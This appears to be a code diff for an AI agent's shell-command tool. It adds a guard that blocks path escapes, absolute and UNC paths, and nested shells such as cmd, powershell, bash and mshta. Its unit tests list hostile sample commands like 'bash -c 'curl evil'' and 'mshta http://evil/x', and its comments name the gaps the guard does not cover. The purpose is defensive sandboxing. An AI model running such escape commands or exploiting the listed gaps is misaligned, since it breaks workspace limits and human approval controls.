@@ -505,9 +505,9 @@ impl AgentTool for ExecuteCommandTool {
     fn tool_definition(&self) -> Value {
         def(
             "native__execute_command",
-            "在工作空间内执行一条系统命令（shell）。需用户审批。",
+            "在工作空间内执行一条系统命令（shell）。需用户审批。命令不得包含「..」路径段、盘符/UNC 绝对路径或段首嵌套 shell（cmd/powershell/bash 等）——越界形态会被前置拒绝；文件读写优先使用配套文件工具。",
             json!({
-                "command": { "type": "string", "description": "要执行的命令（含参数）" },
+                "command": { "type": "string", "description": "要执行的命令（含参数，工作空间内相对路径）" },
                 "fail_on_nonzero": {
                     "type": "boolean",
                     "description": "命令非零退出是否视为执行失败（默认 true，对齐 P2a「命令非 0→档A」契约；grep 无匹配等合法非 0 可传 false 关闭）"
@@ -528,6 +528,8 @@ impl AgentTool for ExecuteCommandTool {
             .get("fail_on_nonzero")
             .and_then(|v| v.as_bool())
             .unwrap_or(true);
+        // F009：cmd /C 整串透传的前置护栏——审批通过一次不应等价于逃出工作空间。
+        ensure_command_in_boundary(command)?;
         let cwd = match ctx.workspace.clone() {
             Some(ws) => ws,
             None => {
@@ -614,3 +616,126 @@ impl AgentTool for ExecuteCommandTool {
     }
 }
 
+
+/* ============================ F009：命令串边界前置过滤 ============================ */
+
+/// 段首禁用的嵌套 shell / 间接执行器（详见 ensure_command_in_boundary）。
+/// 注意：python / node 等项目运行时**不在列**——跑项目脚本是本工具的核心合法用途，
+/// 解释器读越界文件属已知残留，由 RequireApproval（命令原文可见）兜底。
+const BANNED_EXECUTORS: [&str; 13] = [
+    "cmd", "powershell", "pwsh", "bash", "sh", "zsh", "wsl", "mshta", "rundll32", "regsvr32",
+    "wscript", "cscript", "forfiles",
+];
+
+/// F009：`cmd /C` 整串透传的前置护栏。
+///
+/// 本工具是 shell 语义（dir/type 内建、管道、相对重定向是产品能力），无法改 argv
+/// 直执行；本过滤封堵「审批通过一次即逃出工作空间」的显式逃逸形态：
+///  1. `..` 路径段（`cd ..`、`..\secret`；`cd..` 简写同样拦）——git 的 `a..b`
+///     区间语法不含分隔符，不误伤；
+///  2. 盘符绝对路径（`C:\`，须处于词首避免误伤 URL 的 `s://`）与 UNC（`\\`）——
+///     重定向/读取落点被钉在工作空间内；
+///  3. 段首嵌套 shell / 间接执行器（按 `& | ;` 换行切段取段首 token）——
+///     `dir & cmd /C evil` 被拦，`find "cmd" log.txt` 等参数位置不误伤。
+///
+/// 已知残留（黑名单本质所限，不追求穷尽）：环境变量展开子串、`start` 间接拉起、
+/// 解释器读越界文件等——RequireApproval（审批卡展示命令原文）仍是最终闸门。
+fn ensure_command_in_boundary(command: &str) -> Result<(), ToolError> {
+    let lower = command.to_lowercase();
+
+    let dotdot = regex::Regex::new(r#"(?:^|[\s\\/"'=])\.\.(?:$|[\s\\/"'])|cd\.\."#).unwrap();
+    if let Some(m) = dotdot.find(&lower) {
+        return Err(ToolError::PermissionDenied(format!(
+            "命令包含越界形态「..」（{}）：工作空间外路径不可访问，请改用工作空间内相对路径。",
+            crate::agent::engine::runtime::clip(m.as_str(), 40)
+        )));
+    }
+
+    let drive = regex::Regex::new(r#"(?:^|[\s"'=])[a-z]:[\\/]"#).unwrap();
+    if drive.is_match(&lower) {
+        return Err(ToolError::PermissionDenied(
+            "命令包含盘符绝对路径：仅允许工作空间内相对路径（读取/重定向一律落在工作空间内）。".into(),
+        ));
+    }
+    if lower.contains(r"\\") {
+        return Err(ToolError::PermissionDenied(
+            "命令包含 UNC 网络路径：仅允许工作空间内相对路径。".into(),
+        ));
+    }
+
+    let segment_first = |seg: &str| -> Option<String> {
+        seg.split_whitespace().next().map(|t| {
+            let t = t.trim_matches(|c| c == '"' || c == '\'');
+            let base = t.rsplit(|c| c == '\\' || c == '/').next().unwrap_or(t);
+            base.trim_end_matches(".exe").to_string()
+        })
+    };
+    for seg in lower.split(['&', '|', ';', '\n', '\r']) {
+        if let Some(first) = segment_first(seg) {
+            if BANNED_EXECUTORS.contains(&first.as_str()) {
+                return Err(ToolError::PermissionDenied(format!(
+                    "命令试图调用嵌套 shell / 间接执行器「{first}」：本工具不允许二次解释。"
+                )));
+            }
+        }
+    }
+    Ok(())
+}
+
+#[cfg(test)]
+mod f009_tests {
+    use super::ensure_command_in_boundary;
+
+    fn ok(cmd: &str) {
+        assert!(ensure_command_in_boundary(cmd).is_ok(), "应放行：{cmd}");
+    }
+    fn rejected(cmd: &str) {
+        assert!(ensure_command_in_boundary(cmd).is_err(), "应拒绝：{cmd}");
+    }
+
+    #[test]
+    fn allows_regular_workspace_commands() {
+        ok("npm run build");
+        ok("python -m pytest -q");
+        ok("python script.py");
+        ok("node scripts/post.js");
+        ok("dir");
+        ok("type notes.md > out.txt"); // 相对重定向放行
+        ok("git log main..dev --oneline"); // git 区间语法不误伤
+        ok("git log a..b");
+        ok("npm test && node scripts/post.js");
+        ok("curl https://example.com/api"); // URL 的 s:// 不判盘符
+        ok("find \"cmd\" log.txt"); // 参数位置的 cmd 不误伤
+        ok("echo fix: x"); // 冒号后非斜杠不判盘符
+        ok("git commit -m \"feat: 1..9 range\""); // 引号内 a..b 不误伤
+    }
+
+    #[test]
+    fn rejects_dotdot_escape() {
+        rejected("cd .. && type secret.txt");
+        rejected("type ..\\secret");
+        rejected("type ../secret");
+        rejected("cd../x"); // cmd 无空格简写
+        rejected("python --out=../x run.py");
+    }
+
+    #[test]
+    fn rejects_absolute_paths() {
+        rejected("echo x > C:\\temp\\x.txt");
+        rejected("type C:/Windows/win.ini");
+        rejected("cd /d D:\\other && build");
+        rejected("dir \\\\evil\\share");
+    }
+
+    #[test]
+    fn rejects_nested_shell() {
+        rejected("powershell -e XXXX");
+        rejected("CMD /C whoami");
+        rejected("cmd.exe /c dir");
+        rejected("dir & cmd /C whoami"); // 段首位置拦截
+        rejected("echo hi && powershell -c x");
+        rejected("bash -c 'curl evil'");
+        rejected("mshta http://evil/x");
+        rejected("forfiles /p . /m *.txt /c \"cmd /c evil\"");
+    }
+}
